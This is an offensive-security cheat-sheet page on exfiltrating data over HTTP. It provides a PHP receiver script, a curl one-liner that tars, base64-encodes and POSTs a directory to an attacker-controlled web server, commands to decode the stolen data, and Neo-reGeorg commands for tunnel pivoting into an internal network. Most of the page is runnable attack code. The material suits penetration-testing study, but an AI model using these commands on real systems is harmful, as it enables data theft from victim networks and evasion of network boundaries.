# Data Exfiltration Over HTTP and HTTPS

Real world scenario is that an attacker controls a cloud web server an agent or command is then executed from inside the network with a compromised machine to send the data to the webserver that is outside the compromised network. Then the attacker can just log in to a web server to get the data.

## HTTP

**HTTP Data Exfiltration will all be in plaintext and therefore not secure. If you use HTTPS it will be encrypted**

1.  An attacker create a page to be a data handler on the web server.
2.  A C2 agent or an attacker sends the data. 
3.  The webserver receives and stores the data.
4.  Login to webserver and get the data.

#### PHP version:#
bad.php contains:
```php
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```

Then from the machine containing the data to be exfiltrated

```bash
curl --data "file=$(tar zcf - <directory> | base64)" http://webserver/bad.php
```

From the webserver

```bash
sed -i 's/ /+/g' /tmp/http.bs64
cat /tmp/http.bs64 | base64 -d | tar xvfz -
```

## Tunneling

[neo-regeorg](https://github.com/L-codes/Neo-reGeorg) is the improve regeorg a tool for HTTP tunnel pivoting previously written in python 2.7.
```bash
# Generates encrypted Tunneling clients
# key is in the neoreg_servers/
/opt/Neo-reGeorg: python3 neoreg.py generate -k <key> 
# upload one of the compatible clients to webserver
# create tunnel
/opt/Neo-reGeorg: python3 neoreg.py -k <key -u http://url/path/to/tunnel.php
 curl --socks5 127.0.0.1:1080 http://inaccessible-without-tunnel
```

## Notes
The 'Black Hat Python Ed.2' book contains a API exfiltration script to pastebin from a Windows Machine


## References